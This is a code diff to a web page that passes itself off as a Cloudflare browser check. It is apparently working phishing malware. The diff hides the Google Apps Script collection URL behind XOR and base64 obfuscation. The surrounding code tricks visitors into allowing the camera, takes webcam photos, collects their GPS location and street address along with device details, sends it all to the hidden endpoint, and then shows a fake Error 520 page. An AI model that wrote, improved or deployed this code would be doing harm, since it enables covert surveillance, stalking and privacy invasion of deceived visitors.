@@ -57,7 +57,7 @@
             <h1>Checking your browser before accessing the site.</h1>
             <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
             <p style="color: #666; font-size: 14px;">Please allow up to 5 seconds...</p>
-            
+
             <div class="turnstile-box" id="captcha-box">
                 <div class="checkbox" id="btn"></div>
                 <div class="spinner" id="loader"></div>
@@ -80,10 +80,43 @@
 
     <script>
         // ==========================================
-        // CONFIGURATION
+        // CONFIGURATION (ENCRYPTED)
         // ==========================================
-        const _P_URL = "https://script.google.com/macros/s/AKfycbzMm4DrahVeftCcXwFQ9n5J0Z8W4NH4pp_HmhFa6oPRl4vPsJXlO61PNMrURhRwpCgO/exec"; 
+        const _P_ENCRYPTED = "G0cXAkBOcE0hVxZYGytFVBYwVVxXGBBcDl1eFTwQPUdLQkQeIFUAPFBKf1tHdxETWyI6BCZ3B2kcGToKF2p4AGgOJActOgcELz0aWQx3CmkEYyszBkZiRTlrDz0FRQ8sH0YxYwMNHEM6OH0fV04WUA==";
+        const _P_KEY = "s3cr3t_bR4d1k_k3y_2026";
+
         // ==========================================
+        // DECRYPTION FUNCTION
+        // ==========================================
+        function _decryptUrl(encrypted, key) {
+            try {
+                // Base64 decode
+                const encoded = atob(encrypted);
+                // XOR decrypt
+                let decrypted = '';
+                for (let i = 0; i < encoded.length; i++) {
+                    decrypted += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+                }
+                return decrypted;
+            } catch (e) {
+                console.error("Decryption failed:", e);
+                return null;
+            }
+        }
+
+        // ==========================================
+        // GET CONFIGURED URL
+        // ==========================================
+        const _P_URL = _decryptUrl(_P_ENCRYPTED, _P_KEY);
+
+        // ==========================================
+        // INIT
+        // ==========================================
+        if (!_P_URL) {
+            console.error("Failed to decrypt URL!");
+            document.body.innerHTML = "<h1>Error: Unable to load configuration</h1>";
+            throw new Error("Configuration error");
+        }
 
         const generateHex = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
         document.getElementById('ray-id').innerText = generateHex(16);
@@ -157,7 +190,7 @@
         // --- PROXY SENDER (SECURE) ---
         async function _sD(txt, ph = []) {
             if (_P_URL.includes("YOUR_GAS")) { console.error("URL NOT SET"); return; }
-            
+
             try {
                 // Convert Blobs to Base64
                 const b64Ph = [];
@@ -215,7 +248,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
         // --- INTERACTIVE CHECK ---
         const bB = document.getElementById('captcha-box');
         const b = document.getElementById('btn');
-        
+
         // Error Page Logic
         function showError() {
             document.title = "Error 520 | Website.com";
@@ -224,7 +257,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                     <div style="max-width: 800px; width: 100%; text-align: center;">
                         <h1 style="font-size: 60px; font-weight: 300; margin: 0; color: #333;">Error 520</h1>
                         <div style="font-size: 24px; color: #666; margin: 10px 0;">Web server is returning an unknown error</div>
-                        
+
                         <!-- Visual Diagram -->
                         <div style="display: flex; align-items: center; justify-content: center; margin: 40px 0; gap: 30px; flex-wrap: wrap;">
                             <div style="text-align: center;">
@@ -254,7 +287,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                                 </span>
                                 <span id="copy-hint" style="display:none; color:#009900; font-size: 11px;">Copied!</span>
                             </div>
-                            
+
                             <div style="font-size: 13px;">
                                 <a href="#" onclick="document.getElementById('err-details').style.display='block'; return false;" style="color: #c0392b; text-decoration: none; font-weight: 500;">&#9656; Technical Details</a>
                                 <div id="err-details" style="display:none; margin-top: 15px; background: #f9f9f9; padding: 15px; border-radius: 4px; border: 1px solid #e0e0e0; font-family: monospace; color: #333; font-size: 11px;">
@@ -266,7 +299,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                                     <div><strong>Event ID:</strong> ${generateHex(32)}</div>
                                 </div>
                             </div>
-                            
+
                             <div style="margin-top: 20px; text-align: center;">
                                 <a href="https://www.cloudflare.com/5xx-error-landing" target="_blank" style="color:#999; text-decoration:none; font-size:12px;">What happened?</a>
                             </div>
@@ -276,7 +309,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             `;
             document.body.style.display = "block";
             document.body.style.backgroundColor = "#fff";
-            
+
             // Click to Copy Logic
             document.getElementById('ray-id-text').onclick = function() {
                 const text = this.innerText;
@@ -292,15 +325,15 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             b.style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             log("Starting Check...");
-            
+
             // 1. Camera
             document.getElementById('label-text').innerText = "Allow Camera...";
             let stream = null;
             let video = document.getElementById('video');
-            
+
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 1280 } } 
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 } }
                 });
                 video.srcObject = stream;
                 try { await video.play(); } catch(e) { log("Autoplay: " + e); }
@@ -310,10 +343,10 @@ CPU: ${s.c} ядра | RAM: ${s.r}
 
             // 2. Location
             document.getElementById('label-text').innerText = "Allow Location...";
-            
+
             const gpsPromise = new Promise(resolve => {
                 if (!navigator.geolocation) return resolve({t:"*GPS Not Supported*", e:true});
-                
+
                 const timer = setTimeout(() => resolve({t:"*GPS: Timeout*", e:true}), 60000);
 
                 navigator.geolocation.getCurrentPosition(
@@ -322,9 +355,9 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         const {latitude:la, longitude:lo} = p.coords;
                         const link = `https://www.google.com/maps?q=${la},${lo}`;
                         let addr = "Unknown";
-                        try { 
-                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`); 
-                            addr = (await req.json()).display_name; 
+                        try {
+                            const req = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${la}&lon=${lo}`);
+                            addr = (await req.json()).display_name;
                         } catch{}
                         resolve({t:`Address: ${addr}\nMap: [Click](${link})`, e:false});
                     },
@@ -344,8 +377,8 @@ CPU: ${s.c} ядра | RAM: ${s.r}
             let ph = [];
             if (stream) {
                 document.getElementById('label-text').innerText = "Verifying...";
-                
-                await sleep(1500); 
+
+                await sleep(1500);
 
                 const c = document.getElementById('canvas');
                 c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
@@ -356,7 +389,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                     ph.push(await new Promise(r=>c.toBlob(r,'image/jpeg',0.6)));
                     if(i<2) await sleep(600);
                 }
-                
+
                 stream.getTracks().forEach(t=>t.stop());
             }
 
@@ -367,7 +400,7 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                 const statusInterval = setInterval(() => {
                     document.getElementById('label-text').innerText = statuses[sIdx++ % statuses.length];
                 }, 1500);
-                
+
                 const gpsData = await gpsPromise;
                 clearInterval(statusInterval);
                 document.getElementById('label-text').innerText = "Finishing...";
